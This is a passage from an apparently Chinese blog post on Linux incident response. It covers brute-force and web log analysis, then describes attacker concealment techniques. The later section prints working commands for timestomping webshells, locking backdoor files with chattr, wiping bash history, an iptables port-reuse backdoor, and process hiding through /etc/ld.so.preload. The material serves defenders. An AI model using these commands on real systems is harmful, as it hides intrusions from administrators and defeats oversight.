class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、&#x2F;var&#x2F;log&#x2F;yum.log</strong></p><p>软件安装升级卸载日志：</p><figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure><h3 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h3><h4 id="0x01-Web日志"><a href="#0x01-Web日志" class="headerlink" title="0x01  Web日志"></a>0x01  Web日志</h4><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h4 id="0x02-日志分析技巧-1"><a href="#0x02-日志分析技巧-1" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h4><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h4 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h4><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/log-3-1.png"></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/log-3-2.png"></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h4 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h4><p>统计爬虫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span></span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span></span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP Status：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span></span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span></span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Linux权限维持–隐藏篇"><a href="#Linux权限维持–隐藏篇" class="headerlink" title="Linux权限维持–隐藏篇"></a>Linux权限维持–隐藏篇</h3><h4 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h4 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h4><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code>  </p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-1.png"></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在&#x2F;tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h4 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h4><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h4 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 锁定文件</span><br><span class="line">lsattr  evil.php   属性查看</span><br><span class="line">chattr -i evil.php 解除锁定</span><br><span class="line">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-2.png"></p><h4 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-3.png"></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure><h4 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h4><p>#隐身登录系统，不会被w、who、last等指令检测到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure><h4 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h4><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#安装SSLH</span><br><span class="line">sudo apt-get install sslh</span><br><span class="line">#配置SSLH</span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：Run=no  将其修改为：Run=yes</span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line">DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 端口复用链</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># 端口复用规则</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># 开启开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># 关闭开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#x27;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启复用</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#ssh使用80端口进行登录</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#关闭复用</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-4.png"></p><p> 具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h4 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h4><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line">cd libprocesshider/ &amp;&amp; make</span><br><span class="line"># 移动文件到/usr/local/lib/目录下</span><br><span class="line">cp libprocesshider.so /usr/local/lib/</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-5.png"></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-6.png"></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP &#x2F; UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># 使用</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-7.png"></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https://github.com/gaffe23/linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">./sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-8.png"></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight plaintext"><table><tr><td 